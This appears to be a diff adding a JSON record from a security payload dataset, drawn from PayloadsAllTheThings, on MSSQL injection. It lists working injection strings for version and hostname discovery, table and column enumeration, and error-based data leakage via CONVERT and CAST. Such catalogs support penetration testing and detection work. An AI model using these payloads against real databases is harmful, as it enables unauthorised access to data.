@@ -1,0 +1,27 @@
+{
+  "id": "sqli-4202e6b92f4e",
+  "category": "SQLI",
+  "title": "MSSQL Injection",
+  "description": "# MSSQL Injection\n\n> MSSQL Injection  is a type of security vulnerability that can occur when an attacker can insert or \"inject\" malicious SQL code into a query executed by a Microsoft SQL Server (MSSQL) database. This typically happens when user inputs are directly included in SQL queries without proper sanitization or parameterization. SQL Injection can lead to serious consequences such as unauthorized data access, data manipulation, and even gaining control over the database server.\n\n## Summa",
+  "payloads": [
+    "| DBMS version    | `SELECT @@version`                        |",
+    "| Hostname        | `SELECT @@hostname`                       |",
+    "| Hostname        | `SELECT @@SERVERNAME`                     |",
+    "SELECT name FROM <DBNAME>..sysobjects WHERE xtype='U'",
+    "SELECT table_name FROM information_schema.tables WHERE table_catalog='<DBNAME>'",
+    "SELECT COL_NAME(OBJECT_ID('<DBNAME>.<TABLE_NAME>'), <INDEX>)",
+    "| CONVERT      | `AND 1337=CONVERT(INT,(SELECT '~'+(SELECT @@version)+'~')) -- -` |",
+    "| IN           | `AND 1337 IN (SELECT ('~'+(SELECT @@version)+'~')) -- -` |",
+    "| EQUAL        | `AND 1337=CONCAT('~',(SELECT @@version),'~') -- -` |",
+    "| CAST         | `CAST((SELECT @@version) AS INT)` |",
+    "convert(int,@@version)",
+    "cast((SELECT @@version) as int)",
+    "' + convert(int,@@version) + '",
+    "' + cast((SELECT @@version) as int) + '",
+    "SELECT @@version WHERE @@version LIKE '%12.0.2000.8%'"
+  ],
+  "references": [
+    "PayloadsAllTheThings/SQL Injection/MSSQL Injection.md"
+  ],
+  "source": "PayloadsAllTheThings"
+}
